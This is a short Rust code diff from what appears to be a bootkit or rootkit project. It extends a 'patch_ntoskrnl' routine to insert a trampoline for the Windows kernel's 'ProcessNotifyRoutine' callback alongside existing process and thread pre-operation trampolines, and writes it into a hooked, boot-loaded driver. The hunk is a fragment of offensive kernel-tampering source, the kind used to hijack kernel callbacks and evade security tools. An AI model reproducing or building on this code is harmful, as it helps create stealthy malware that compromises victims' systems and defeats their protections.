@@ -81,6 +81,11 @@ pub fn patch_ntoskrnl(
         c"ThreadPreopCallback",
         load_order_list_head,
     );
+    let process_notify_trampoline = _insert_object_callback_trampoline(
+        driver_image_base,
+        c"ProcessNotifyRoutine",
+        load_order_list_head,
+    );
 
     match unsafe { utils::get_boot_loaded_module(load_order_list_head, TARGET_HOOKED_DRIVER) } {
         Some(injected_driver) => {
@@ -111,6 +116,7 @@ pub fn patch_ntoskrnl(
                     },
                     process_preop_trampoline,
                     thread_preop_trampoline,
+                    process_notify_trampoline,
                 };
                 empty_buffer = &mut empty_buffer[size..];
                 empty_buffer
